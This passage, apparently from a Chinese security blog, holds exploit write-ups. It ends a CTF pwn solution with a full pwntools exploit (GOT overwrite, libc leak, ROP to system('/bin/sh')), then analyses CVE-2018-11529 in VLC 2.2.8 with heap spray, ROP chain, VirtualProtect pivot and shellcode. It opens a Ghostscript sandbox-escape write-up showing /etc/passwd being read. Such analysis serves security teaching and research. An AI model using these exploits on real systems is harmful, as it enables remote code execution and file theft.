第二次输入将返回地址覆盖为puts，返回地址依然设为main以获得第三次输入的机会，同时将puts的GOT表项作为puts的参数，这样我们就可以泄漏libc中puts的地址。 12345678910111213141516171819202122232425... payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) # return address payload += p32(binary.symbols['main']) # return from puts payload += p32(binary.symbols['got.puts']) # args of puts # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') # `Login successful!`后的回显 p.recvline() # 读取完整的该行回显 leak = p.recvline()[:4] # 第二次puts的输出，取前4字节 leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh)... 第三步：通过ROP get shell泄漏出libc地址后，通过ROP get shell 123456789payload = 'a' * 0x50payload += p32(libc.symbols['system'])payload += 'a' * 0x4 # 任意4字节payload += p32(bin_sh)input_username(payload)input_passsword(p32(0))p.interactive() 完整exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/pythonfrom pwn import *context.os = 'linux'context.terminal = ['tmux', 'splitw', '-h']# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']context.log_level = 'DEBUG'libc_path = './libc-2.19.so'bin_path = './login'libc = ELF(libc_path)binary = ELF(bin_path)host = ''port = 6666def debug(command=''): gdb.attach(p, command)def input_username(name): p.recvuntil('username:') p.sendline(name)def input_passsword(password): p.recvuntil('password:') p.sendline(password)def exploit(): #debug('b *0x8048751\\nc\\n') payload = p32(binary.symbols['got.__stack_chk_fail']) # stack payload += 'a' * (0x48+0x4) # stack+ebp payload += p32(binary.symbols['main']) # ret addr payload += 'a' * 0x26 # padding payload += r'%s:%39x%10$hhn' + '\\x00' input_username(payload) input_passsword(p32(0)) payload = 'a' * 0x50 payload += p32(binary.symbols['plt.puts']) payload += p32(binary.symbols['main']) payload += p32(binary.symbols['got.puts']) # leak libc input_username(payload) input_passsword(p32(0)) p.recvuntil('aaaa') p.recvline() leak = p.recvline()[:4] leak = u32(leak) print 'leak = ', hex(leak) libc.address = leak - libc.symbols['puts'] print 'libc.address = ', hex(libc.address) system = libc.symbols['system'] bin_sh = next(libc.search('/bin/sh\\x00')) print 'system = ', hex(system) print 'bin_sh = ', hex(bin_sh) payload = 'a' * 0x50 payload += p32(libc.symbols['system']) payload += p32(binary.symbols['main']) payload += p32(bin_sh) input_username(payload) input_passsword(p32(0)) p.interactive()if __name__ == '__main__': if len(sys.argv) == 1: global p p = process(executable=bin_path, argv=[bin_path]) #, env={'LD_PRELOAD':libc_path}) else: p = remote(host, port) exploit() exp运行结果：","link":"/post/34549.html"},{"title":"CVE-2018-11529——VLC Media Player UAF漏洞","text":"本文主要分析VLC Media Player 2.2.8版本的MKV格式视音频分离模块（demuxer）libmkv_plugin中存在的一个UAF漏洞，该模块的一个matroska_segment_c对象在释放后被重引用，可以通过构造大量和该对象大小相同的数据块，最终使这块内存重新被分配，程序再引用该对象时，便可控制程序指针，然后通过精确的Heap Spray布置shellcode，最后通过ROP绕过DEP，造成任意代码执行。 原本首发于Freebuf上，但感觉当时写的有些乱，所以现在重新整理了一下，主要从漏洞细节和漏洞的利用两大部分对漏洞进行分析。 背景知识MKVMKV格式属于Matroska开源多媒体容器标准中的一种。它是建立在EBML语言的基础上，这是一种类似于XML格式的可扩展二进制元语言，使用可变长度的整数存储，以节省空间。 EBML元素都有自己的级别，每一个高一级的元素由若干次一级的元素组成。从整个MKV文件整体来看可分为EBML和Segment两大部分，这两大部分又可分为几个子元素，如下所示： EBML EBMLVersion DocType Segment Meta Seek Segment information Track Chapters Cluster Cueing Data Attachment Tagging 该漏洞利用中涉及到的几个部分功能如下： Meta Seek：提供文件中其他元素的位置索引 Segment information：提供识别文件至关重要的信息 Cluster：包含所有音轨和视频帧 Chapters：包含所有章节（一种预定义点，以跳转到视频或音频的方法） Attachment：用于附加任何类型的文件，如图片、网页、程序等。 这些元素还可继续划分为更小的部分，会在后面的利用中具体说明，最后附上一张图标以供参考： 视音频处理声音与图像是两种不同的媒体，只能用专门处理声音的程序或专门处理视频的程序去分别解析音频流（Audio Stream）与视频流（Video Stream）。而我们平时看的MKV、AVI等格式的电影却是既包含声音又包含视频画面的单个文件，这是因为我们对音频流和视频流进行了“合成”，将音频与视频就打包成一个单独的文件，这个过程就叫Multiplex，简称mux，意为“混流”、“封装”的意思。 通过 muxing，可以将视频流、音频流甚至是字幕流捆绑到一个单独的文件中，Demux即是进行与muxing相反的“分解复用”操作，也就是“分离”一个文件中的视频部分或是音频部分来进行解码和播放。 视音频分离器（Demuxer）即是将封装格式数据（例如MKV）中的视频压缩数据（例如H.264）和音频压缩数据（例如AAC）分离开，在这个过程中并不涉及到编码和解码。 分析环境 Windows 10 1803（x64） Windbg x86/x64 10.0 IDA Pro 7.0 漏洞程序VLC Media Player 2.2.8 获取途径一：直接下载安装包（优点：方便，缺点：没有调试信息） 获取途径二：从源码自行编译（优点：有调试信息，缺点：需跨平台交叉编译，较复杂） 由于VLC Media Player的release版本没有调试信息，Debug版本也是DWARF格式调试信息，而非PDB格式，所以在Windbg中调试时依然无法看到符号信息，而且目前Debug版本也不知道上哪下了。。 从源码自行编译程序，官方推荐使用MinGW在Linux环境下交叉编译VLC Media Player，这样带有调试信息的程序可以方便我们使用IDA静态分析。（这里特别想要说明的一点是，该漏洞之所以能够成功利用，Mingw生成的Windows可执行文件默认情况下会从中删除重定位表。Windows 的ASLR无法随机化无重定位表的可执行文件，这使得Mingw编译时即使声明了ASLR相关选项。失去了ASLR的保护后，使ROP攻击称为可能。该漏洞编号为CVE-2018-5392，但和今天要分析的漏洞无关~就不展开讲了，有兴趣可以参考文末参考资料的”When “ASLR” Is Not Really ASLR“） 编译过程可以参考VLC官网：Win32Complie 另外，也可以直接在Windows上使用GDB进行调试，这样就会有调试信息；或者直接用IDA来调试界面会更加友好~ 环境准备好后，可以测试一下PoC有没有问题： 漏洞分析分析一个UAF漏洞，我们首先要确定下面几个问题： 如何定位漏洞触发点？ 程序中什么对象导致产生了UAF？ 该对象的内存在哪分配？ 该对象在何处释放？ 该对象在何处重新分配？ 明确目标后，下面我们就开始逐一解决这些问题。 开启PageHeap hpa定位异常位置 寻找内存首次分配位置 结合源码分析 通过监控堆块HEAP_ENTRY结构定位释放位置 漏洞触发点要找到漏洞触发的位置，使用Windbg自带工具gflag开启页堆： 1λ gflags.exe /i vlc.exe +hpa 将WinDbg附加到vlc.exe上，打开poc.mkv，我们可以看到该程序在调用dword ptr [edx + 28h]时崩溃，位于libmkv_plugin.dll模块。 123456789(1e64.924): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\\Users\\zengy_lctlkhn\\Desktop\\vlc-2.2.8\\plugins\\demux\\libmkv_plugin.dll - eax=24536fd8 ebx=13f84fac ecx=14114d50 edx=18730fe8 esi=1cb5fe08 edi=14114d50eip=6e2a753a esp=1cb5fd18 ebp=0f254f00 iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010206libmkv_plugin+0x3753a:6e2a753a 8b4d28 mov ecx,dword ptr [ebp+28h] ss:002b:0f254f28=???????? 再结合IDA和源码分析可知，位置是在函数Control()中的如下位置： 1234567891011121314151617181920//vlc-2.2.8/modules/demux/mkv/mkv.cpp...case DEMUX_GET_FPS: pf = (double *)va_arg( args, double * ); *pf = 0.0; if( p_sys-&gt;p_current_segment &amp;&amp; p_sys-&gt;p_current_segment-&gt;CurrentSegment() ) { const matroska_segment_c *p_segment = p_sys-&gt;p_current_segment-&gt;CurrentSegment(); for( size_t i = 0; i &lt; p_segment-&gt;tracks.size(); i++ ) { mkv_track_t *tk = p_segment-&gt;tracks[i]; if( tk-&gt;fmt.i_cat == VIDEO_ES &amp;&amp; tk-&gt;fmt.video.i_frame_rate_base &gt; 0 ) { *pf = (double)tk-&gt;fmt.video.i_frame_rate / tk-&gt;fmt.video.i_frame_rate_base; break; } } } return VLC_SUCCESS;... 确定UAF对象和其释放位置查看内存属性，为PageHeap 1234567891011120:012&gt; !address [ebp+28h]Usage: PageHeapBase Address: 0f24f000End Address: 0f256000Region Size: 00007000 ( 28.000 kB)State: 00002000 MEM_RESERVEProtect: &lt;info not present at the target&gt;Type: 00020000 MEM_PRIVATEAllocation Base: 0f1c0000Allocation Protect: 00000001 PAGE_NOACCESSMore info: !heap -p 0x5e61000More info: !heap -p -a 0xf254f28 查看该内存分配的callback，发现在0x6e278e53处释放，到这里基本可以确定是UAF了。 再通过静态分析，可知释放的位置在matroska_segment_c对象的析构函数~matroska_segment_c()中。到这里可以初步推测matroska_segment_c对象发生了UAF。 1234567891011120:012&gt; !heap -p -a 0xf254f28 address 0f254f28 found in _DPH_HEAP_ROOT @ 5e61000 in free-ed allocation ( DPH_HEAP_BLOCK: VirtAddr VirtSize) 11cc3784: f254000 2000 74b5adc2 verifier!AVrfDebugPageHeapFree+0x000000c2 777097a3 ntdll!RtlDebugFreeHeap+0x0000003e 7765dd1e ntdll!RtlpFreeHeap+0x000000ce 776a6bfb ntdll!RtlpFreeHeapInternal+0x00000783 7765dbf6 ntdll!RtlFreeHeap+0x00000046 76727409 msvcrt!free+0x00000069 6e278e53 libmkv_plugin+0x00008e53 下面是IDA反编译的结果：12345678void __fastcall matroska_segment_c::~matroska_segment_c(matroska_segment_c *const this){ matroska_segment_c *v1; // ebx v1 = this; matroska_segment_c::~matroska_segment_c(this); operator delete(v1);} 确定UAF对象重新分配的位置现在关闭页堆后重新打开vlc.exe，并在上面异常的位置下断，可以看到[ebp+28h]处的值为0x22000020。 123456Breakpoint 0 hiteax=034eb680 ebx=0361894c ecx=03628b18 edx=02b78238 esi=03c2fe08 edi=03628b18eip=6dd6753a esp=03c2fd18 ebp=06c56aa8 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202libmkv_plugin+0x3753a:6dd6753a 8b4d28 mov ecx,dword ptr [ebp+28h] ss:002b:06c56ad0=22000020 查看[ebp]，会发现内容正好是poc中的UAF_object 1234567890:012&gt; dd [ebp]06c56aa8 41414141 41414141 41414141 4141414106c56ab8 41414141 41414141 41414141 4141414106c56ac8 41414141 41414141 22000020 2201002006c56ad8 41414141 41414141 41414141 4141414106c56ae8 41414141 41414141 41414141 4141414106c56af8 41414141 41414141 41414141 4141414106c56b08 41414141 41414141 41414141 4141414106c56b18 41414141 41414141 41414141 41414141 接下来看看这块内存在何处分配的： 12345678910110:012&gt; !heap -p -a ebp address 071dcdc8 found in _HEAP @ 3000000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 071dcdb0 0023 0000 [00] 071dcdc8 00100 - (busy) unknown!noop 776f3404 ntdll!RtlpCallInterceptRoutine+0x00000026 776b09aa ntdll!RtlpAllocateHeapInternal+0x00055bca 7765adce ntdll!RtlAllocateHeap+0x0000003e 76727610 msvcrt!malloc+0x00000090 6e3b6fde libmkv_plugin+0x00036fde 0x6e3b6fde位于函数Control()中如下位置： 1234567891011121314151617181920case DEMUX_GET_ATTACHMENTS: ppp_attach = (input_attachment_t***)va_arg( args, input_attachment_t*** ); pi_int = (int*)va_arg( args, int * ); if( p_sys-&gt;stored_attachments.size() &lt;= 0 ) return VLC_EGENERIC; *pi_int = p_sys-&gt;stored_attachments.size(); *ppp_attach = (input_attachment_t**)malloc( sizeof(input_attachment_t*) * p_sys-&gt;stored_attachments.size() ); if( !(*ppp_attach) ) return VLC_ENOMEM; for( size_t i = 0; i &lt; p_sys-&gt;stored_attachments.size(); i++ ) { attachment_c *a = p_sys-&gt;stored_attachments[i]; //vlc_input_attachment_New再次分配 (*ppp_attach)[i] = vlc_input_attachment_New( a-&gt;fileName(), a-&gt;mimeType(), NULL, a-&gt;p_data, a-&gt;size() ); } return VLC_SUCCESS; 现在UAF对象重新分配的位置就确定了。 确定UAF对象分配位置现在只剩如何确定对象最开始分配的位置了，这里我试了开启ust追踪内存分配，但总会导致异常，试了几次之后只好放弃了。 所以还是回到刚开始，中断在mov ecx,dword ptr [ebp+28h]时，取[ebp+28h]中的数据为0x22000020到ecx，所以我们可以对这块内存下断观察后续会对它做什么操作。 继续运行两次，断在了函数matroska_segment_c::UnSelect()中123456789100:012&gt; ba r4 [ebp+28h]0:012&gt; g...0:012&gt; gBreakpoint 1 hiteax=220002dc ebx=00000000 ecx=22010020 edx=22000020 esi=06e23eb0 edi=008e0f18eip=6dcbaf50 esp=03a8fe18 ebp=03521efc iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246libmkv_plugin+0xaf50:6dcbaf50 89c8 mov eax,ecx这里的call指令调用了一个位于vlc.exe模块中的地址，结合PoC来看也是ROP链第一个gadget的地址。继续往后执行几步便会触发漏洞，弹出计算器。 12345678910110:012&gt; p...0:012&gt; p......0:012&gt; peax=2200031c ebx=00000000 ecx=220002e4 edx=22000310 esi=06e23eb0 edi=008e0f18eip=6dcbaf80 esp=03a8fe18 ebp=03521efc iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202libmkv_plugin+0xaf80:6dcbaf80 ff5208 call dword ptr [edx+8] ds:002b:22000318=0040ae91 由于程序每次加载时堆的地址都是不固定的，也无法靠下断点来进行分析，那么我们只能结合IDA和源码来分析了。通过交叉引用找到调用matroska_segment_c::UnSelect()的Close()函数，观察matroska_segment_c *是从哪取出的，步骤整理如下： 将p_this强制转换为demux_t*型并赋值给p_demux 将p_demux-&gt;p_sys赋给p_sys 将p_sys-&gt;p_current_segment赋给p_vsegment 调用p_vsegment-&gt;CurrentSegment()将返回值赋给p_segment，注意这个变量类型为matroska_segment_c * 最后调用p_segment-&gt;UnSelect()方法触发漏洞 再来看看定义该函数的文件： 12345678//vlc-2.2.8/modules/demux/mkv/mkv.cpp...static int Open ( vlc_object_t * );static void Close( vlc_object_t * );static int Demux ( demux_t * );static int Control( demux_t *, int, va_list );static void Seek ( demux_t *, mtime_t i_date, double f_percent, virtual_chapter_c *p_chapter );... 文件中定义了Open()、Close()和Control()等函数，通过函数名和注释可知，程序在处理mkv文件时，首先执行Open()函数。而Open()和Close()都有相同的参数p_this，在上面的分析中，UAF对象的指针正是从该结构体中取出的。刚进入Open()函数时，对象的初始化应该都没有完成，我们只需监视p_demux结构在上述内存偏移中的变化，就能找到分配UAF对象的地方。 在函数Open()起始地址处下断点，然后找到该函数参数p_this的位置，在其相应偏移处设置内存访问断点，观察这些位置内存的变化。 1234567891011120:011&gt; bp libmkv_plugin!vlc_entry_license__2_2_0b+0x10a00:011&gt; g...Breakpoint 0 hiteax=6cd48ea0 ebx=029a9be8 ecx=035a393c edx=03b0fd2c esi=742d16f0 edi=74a66f20eip=6cd48ea0 esp=03b0fc64 ebp=03b0fcd8 iopl=0 nv up ei pl nz na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000206libmkv_plugin!vlc_entry_license__2_2_0b+0x10a0:6cd48ea0 55 push ebp0:012&gt; dd esp03b0fc64 742d1740 035a393c 03b0fd2c 0000000003b0fc74 00000000 029a9be8 00000000 029a9be8 根据上面整理的Close()中的的步骤，查看0x48处的p_demux-&gt;p_sys 继续查看0x6c处的p_vsegment 当中断于此处时，p_vsegment的被赋值，我们根据各成员的偏移继续查看，直到找到matroska_segment_c 123456Breakpoint 2 hiteax=035cfb50 ebx=00000000 ecx=06c8e748 edx=02a568e0 esi=035cfba4 edi=035cfba4eip=6cd2d128 esp=03b0fa28 ebp=03b0fb00 iopl=0 nv up ei pl zr na pe nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000246libmkv_plugin+0x1d128:6cd2d128 0f8402070000 je libmkv_plugin+0x1d830 (6cd2d830) [br=1] 上图中标注this的位置就是为matroska_segment_c分配的内存，内存状态为busy 1234560:012&gt; !heap -p -a 06c531d8 address 06c531d8 found in _HEAP @ e70000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 06c531d0 0021 0000 [00] 06c531d8 00100 - (busy) ? libmkv_plugin!vlc_entry_license__2_2_0b+12a970 在IDA中查看该地址，定位在函数demux_sys_t::PreloadLinked()中，且只在函数Open()中被引用，所以很快就能在源码中找到分配该内存的位置：123456if ( !p_sys-&gt;PreloadLinked() || !p_sys-&gt;PreparePlayback( NULL ) ){ msg_Err( p_demux, \"cannot use the segment\" ); goto error;} 所以到目前位置，现在最开始的5个问题都已经解决了。 进一步证明分析接下来我们还可以继续调试，来验证上面的分析是否正确 描述一个堆块的数据结构是HEAP_ENTRY，它位于一个堆块起始处前8字节，而一个堆块的状态由占用状态变为空闲状态时，对于已释放的堆块，堆管理器定义了HEAP_FREE_ENTRY结构来描述，相比HEAP_ENTRY，它多了8个字节的LIST_ENTRY结构用于存放空闲链表（Free List）的节点。 那么要定位到该堆块释放的位置就是十分容易了，我们只需要在HEAP_ENTRY处设置内存访问断点，当堆块释放时HEAP_ENTRY中某些标志位发生改变就能立刻断下。 继续运行，不出所料的断在了RtlpFreeHeapInternal中，kb查看栈回溯，就可以找到libmkv_plugin.dll中释放这块内存位置。 1234567891011121314Breakpoint 3 hiteax=06ea5db8 ebx=00000000 ecx=00000000 edx=06ea5db8 esi=00900000 edi=06ea5db0eip=77246553 esp=03a8f9a8 ebp=03a8f9f4 iopl=0 nv up ei ng nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000282ntdll!RtlpFreeHeapInternal+0xdb:77246553 7509 jne ntdll!RtlpFreeHeapInternal+0xe6 (7724655e) [br=1]0:012&gt; kb # ChildEBP RetAddr Args to Child 00 03a8f9f4 771fdbf6 00000000 00000000 00000000 ntdll!RtlpFreeHeapInternal+0xdb01 03a8fa14 74a27409 00900000 00000000 06ea5db8 ntdll!RtlFreeHeap+0x4602 03a8fa60 6dd48e53 06ea5db8 ffffffff 03a8ff58 msvcrt!free+0x69WARNING: Stack unwind information not available. Following frames may be wrong.03 03a8fa80 6dd5b48f 008c68e0 008c6800 ffffffff libmkv_plugin+0x8e5304 03a8fac0 6dd5b788 03521e04 6de85fc0 6de86fdc libmkv_plugin+0x1b48f Step Over几次跳出到libmkv_plugin中，堆块状态已经由busy变为了free，同时libmkv_plugin+0x8e53的位置刚好和上面3.2中对上 再Step Over一次到libmkv_plugin+0x1b48f，由IDA中分析可知位于以下位置： 继续追踪堆块的变化，当堆块状态变为busy时，就是重新分配的位置。 123456780:012&gt; kb # ChildEBP RetAddr Args to Child 00 03a8fcd8 771fadce 00000000 00000000 00000100 ntdll!RtlpAllocateHeapInternal+0x31101 03a8fcf0 74a27610 00900000 00000000 00000100 ntdll!RtlAllocateHeap+0x3e02 03a8fd10 6dd76fde 00000100 035d2710 00000100 msvcrt!malloc+0x90WARNING: Stack unwind information not available. Following frames may be wrong.03 03a8fd20 742e62cc 0085dd88 03a8fd78 742e51c0 libmkv_plugin+0x36fde04 03a8fd80 7429154d 03521e04 0000000e 03a8fdb0 libvlccore!var_SetChecked+0x11c 用同样的方法，可知重新分配发生在，也和上面的分析相契合。 漏洞成因libmkv_plugin.dll中的Open()函数调用ProloadLinked()时，创建了一个virtual_segment_c对象，在该对象的构造函数中，matroska_segment_c对象被初始化。而后面的FreeUnused()函数中又释放掉了matroska_segment_c对象，如下图所示。然后在函数Control()中，通过添加mkv文件attachment的方式，使得这块内存再次被分配，如上图所示。 当然，这也不是最后触发漏洞的位置，下面的漏洞利用中将会具体介绍这个UAF如何被利用的。 而在Close()函数中，p_vsegment调用CurrentSegment()方法返回了一个指向matroska_segment_c的指针赋值给p_segment，但该指针指向的对象matroska_segment_c已经被释放，p_segment是一个悬空指针。 漏洞利用漏洞作者给出的PoC 利用流程如下： 第一步：构造mkv文件基本结构 第二步：在mkv文件的Attachments结构中构造UAF对象 第三步：编写shellcode作为Heap Spray的Payload 第四步：通过调试确定Heap Spray的数量和每块的大小 第五步：将Payload作为mkv文件的Cluster结构 第六步：任意生成一个mkv文件（触发漏洞需要有另一个mkv文件在相同目录） 第七步：拼接各个结构 第八步：用VLC打开mkv，触发漏洞返回shell UAF漏洞利用的通用思路就是通过“占位”，将对象中的函数指针覆盖为ROP链的第一个gadget，通过第一个gadget进行Stack Pivot，将程序栈迁移的Heap Spray的内存中，进而通过ROP进行利用，思路可以概括如下： 控制程序执行流程——利用UAF覆盖对象函数指针 稳定的寻址shellcode——绕过ASLR（Heap Spray） 让shellcode得以执行——绕过DEP（ROP和Stack Pivot） 下面就按照上面的思路来具体分析。 Heap Spray部署shellcode一个MKV文件所有的音视频帧数据都存放在Cluster这个结构中。每个Cluster内可能有很多个BlockGroup组成，BlockGroup内又由若干个Block组成。这些Block内就是音视频的帧数据。在PoC就是构造了数十个大小为0xfff000的Cluster，并将喷射数据放入每个Block中。 为了保证每次利用的稳定性，这里使用了很巧妙的方法。 我们可以观察到，当堆块进行大量分配的时候，堆地址的低位不会发生变化，仅有几个高字节是改变的，查看堆喷的内存块，可以看到每次打开PoC堆喷的地址总是以“018”结尾的，变化的总是前面的高位地址，所以我们只需以将每个Block的大小控制为0x1000，就能够准确得到喷射的位置。以下图为例，0x22000020所在堆块的UserPtr是0x211e5020。(0x211e5020 - 0x22000020)/0x1000 = 0xE1B(3611)刚好能被整除，也就是0x22000020的内容能被我们精确控制，因为它永远是一个Block的起始地址。 1234567891011121314151617181920212223240:012&gt; !heap -flt s 0xfff000 _HEAP @ 7c0000 _HEAP @ 6f0000 HEAP_ENTRY Size Prev Flags UserPtr UserSize - state 07248018 200000 0000 [00] 07248020 fff000 - (busy VirtualAlloc) 08256018 200000 0000 [00] 08256020 fff000 - (busy VirtualAlloc) 09269018 200000 0000 [00] 09269020 fff000 - (busy VirtualAlloc) 0a27d018 200000 0000 [00] 0a27d020 fff000 - (busy VirtualAlloc) 0b280018 200000 0000 [00] 0b280020 fff000 - (busy VirtualAlloc) 0c292018 200000 0000 [00] 0c292020 fff000 - (busy VirtualAlloc) 0d2a2018 200000 0000 [00] 0d2a2020 fff000 - (busy VirtualAlloc) 0e2bb018 200000 0000 [00] 0e2bb020 fff000 - (busy VirtualAlloc) 0f2c9018 200000 0000 [00] 0f2c9020 fff000 - (busy VirtualAlloc) 102d0018 200000 0000 [00] 102d0020 fff000 - (busy VirtualAlloc) 112e1018 200000 0000 [00] 112e1020 fff000 - (busy VirtualAlloc) 122f3018 200000 0000 [00] 122f3020 fff000 - (busy VirtualAlloc) 13303018 200000 0000 [00] 13303020 fff000 - (busy VirtualAlloc) 14315018 200000 0000 [00] 14315020 fff000 - (busy VirtualAlloc) 15320018 200000 0000 [00] 15320020 fff000 - (busy VirtualAlloc) 1633c018 200000 0000 [00] 1633c020 fff000 - (busy VirtualAlloc) 17342018 200000 0000 [00] 17342020 fff000 - (busy VirtualAlloc) 1835e018 200000 0000 [00] 1835e020 fff000 - (busy VirtualAlloc) 19369018 200000 0000 [00] 19369020 fff000 - (busy VirtualAlloc) ... 构造UAF对象MKV的Attachment部分主要是用于支持在文件中附加任何类型的文件，包括图片、网页、程序等。通过构造500个大小与之前被释放的matroska_segment_c大小相同的attachments，使释放掉的内存被重新分配。 结合源码可以看到，最后触发漏洞的函数并不是UAF对象的方法，而是从UAF对象中又取出的其他，所以在上面堆喷的数据中不仅布置了shellcode，还有demux_sys_t、demux_t和es_out_t这些结构。最终触发漏洞的es_out_Del函数的指针就定义在es_out_t这个结构中，回过头看看堆喷数据中，该指针已被布置为了ROP chains的起始地址。 绕过 DEP&amp;ASLR前面提到过，因为Mingw的漏洞，vlc.exe是没有地址随机化能力的。所以我们可以在vlc.exe模块中寻找可用的gadget，构造ROP chains。 不同于普通的栈溢出，此时我们能控制的只有几个寄存器的值，而当前程序的栈空间是不可控的，所以在ROP链的开始利用Stack Pivot，将栈指针esp指向堆喷的内存中，相当于将堆作为栈来使用。 1234567eax=2200031c ebx=00000000 ecx=220002e4 edx=22000310 esi=06e57358 edi=00f72298eip=6e3aaf80 esp=03a5fe18 ebp=034e8464 iopl=0 nv up ei pl nz na po nccs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000202libmkv_plugin+0xaf80:*** WARNING: Unable to verify timestamp for C:\\Users\\zengy_lctlkhn\\Desktop\\vlc-2.2.8\\vlc.exe*** ERROR: Module load completed but symbols could not be loaded for C:\\Users\\zengy_lctlkhn\\Desktop\\vlc-2.2.8\\vlc.exe6e3aaf80 ff5208 call dword ptr [edx+8] ds:002b:22000318=0040ae91 Stack Pivot 12345vlc+0xae91:0040ae91 94 xchg eax,esp0040ae92 004100 add byte ptr [ecx],al0040ae95 8b00 mov eax,dword ptr [eax]0040ae97 c3 ret 12340:012&gt; dd esp2200031c 00407086 00000040 0040b058 414141412200032c 41414141 41414141 004039c7 220000302200033c 41414141 004039c8 0041193d 00409d18 取出edi的值 123vlc+0x7086:00407086 5f pop edi00407087 c3 ret 12340:012&gt; dd esp22000320 00000040 0040b058 41414141 4141414122000330 41414141 004039c7 22000030 4141414122000340 004039c8 0041193d 00409d18 00000201 将 edi 的值放入 edx,剩下的三条指令没有实际作用，在栈上填充无用的数据 来补偿被三个 pop 指令弹出的值 123456vlc+0xb058:0040b058 89fa mov edx,edi0040b05a 5e pop esi0040b05b 5f pop edi0040b05c 5d pop ebp0040b05d c3 ret 剩下的几条 gadget 在为后面布置栈的内容做准备。1234vlc+0xb04d:0040b04d 5f pop edi0040b04e 5d pop ebp0040b04f c3 ret 1234vlc+0x39c7:004039c7 58 pop eax004039c8 59 pop ecx004039c9 c3 ret 12345678910111213141516171819vlc+0x39c8:004039c8 59 pop ecx004039c9 c3 retvlc+0x9d18:00409d18 5b pop ebx00409d19 c3 retvlc+0xa623:0040a623 5d pop ebp0040a624 c3 retvlc+0x36cb:004036cb 5e pop esi004036cc c3 retvlc+0x36cb:004036cb 5e pop esi004036cc c3 ret 将上面寄存器中的值压入栈中 12vlc+0xaf61:0040af61 60 pushad 12340:012&gt; dd esp2200034c 0040ae95 0040848c 0040a623 2200036c2200035c 00000201 00000040 0041193d 220000302200036c 22000600 00000000 00000000 00000000 设置 VirtualProtectStub 的参数 123vlc+0xae95:0040ae95 8b00 mov eax,dword ptr [eax]0040ae97 c3 ret 转跳到 VirtualProtectStub 函数中，修改喷射内存的的执行权限 12vlc+0x848c:0040848c ff248500e04000 jmp dword ptr vlc+0xe000 (0040e000)[eax*4] ds:002b:00411308={KERNEL32!VirtualProtectStub (750a7c70)} 123vlc+0xa623:0040a623 5d pop ebp0040a624 c3 ret 完成后转跳到 shellcode 继续执行 12345678922000600 83e4fc and esp,0FFFFFFFCh22000603 31d2 xor edx,edx22000605 52 push edx22000606 6863616c63 push 636C6163h2200060b 54 push esp2200060c 59 pop ecx2200060d 52 push edx2200060e 51 push ecx... 要实现漏洞的利用，只需简单的修改PoC中的shellcode部分就行，下面是经过修改的用于MSF的漏洞利用模块。 参考资料MKV File Format Specification matroska Diagram When “ASLR” Is Not Really ASLR","link":"/post/8256c260.html"},{"title":"CVE-2018-16509——Ghostscript沙箱逃逸漏洞","text":"2018年8月21日，Google安全研究员Tavis Ormandy披露了多个GhostScript的漏洞，在9.24之前的版本中，通构造恶意PostScript脚本，可以绕过SAFER安全沙箱，从而造成文件读取、文件删除甚至命令执行等严重后果。其根本原因是GhostScript解析PostScript的”restore“命令时，会暂时将参数“LockSafetyParams”设置为“False”，从而关闭SAFER模式。 开始分析前，先得说一说PostScript——由Adobe开发的一种页面描述语言（PDL），它桌面出版革命中发挥了关键作用。它是世界上第一个与设备无关的页面描述语言，也是一种编程语言。如今世界各地的企业都依赖PostScript来准确地打印来自任何应用程序的文档，同时也为Adobe PDF格式的发展铺平了道路。 作为一种解释型的语言，PostScript必然需要一个解释器来执行，Ghostscript就是一个广泛应用于各种平台和应用程序的PostScript解释器，ImagineMagic、Python PIL等常用工具都依赖于它。 环境搭建目前大多数Linux发行版中的GhostScript都应该已经更新了，所以我们需要从源码编译安装，可以从GitHub下载源码，也可以通过git工具下载。 安装环境：Ubuntu Server 16.04.04 64位集成环境：GCC 5.4.0调试环境：GDB-7.11.1 123456$ tar xvJf ghostscript-9.23.tar.xz$ cd ghostscript-9.23$ apt-get build-dep ghostscript #安装所需依赖$ CFLAGS=\"-g -O0\" ./configure #CFLAGS中的两个选项是为了方便后续的调试$ make$ make install 安装完成就可进入GhostScript的交互界面了 12345$ gs -sDEVICE=ppmrawGPL Ghostscript 9.23 (2018-03-21)Copyright (C) 2018 Artifex Software, Inc. All rights reserved.This software comes with NO WARRANTY: see the file PUBLIC for details.GS&gt; 漏洞分析Ghostscript安全模式Ghostscript包含一个可选的-dSAFER选项，设置该选项启动安全沙箱模式后，与文件相关的操作符将被禁止，具体作用如下： 禁用deletefile和renamefile操作符，能够打开管道命令（％pipe％cmd），同时只能打开stdout和stderr进行写入 禁用读取stdin以外的文件 设置设备的LockSafetyParams参数为True，从而防止使用OutputFile参数写入文件 阻止/GenericResourceDir、/FontResourceDir、/SystemParamsPassword或/StartJobPassword被更改 例如当我们未加-dSAFER参数时，可以成功读取/etc/passwd文件：123456789vuln@ubuntu:~$ gs -q -sDEVICE=ppmrawGS&gt;/buff 1024 string defGS&gt;/file_obj (/etc/passwd) (r) file defGS&gt;file_obj buff readstringGS&lt;2&gt;buff printroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin... 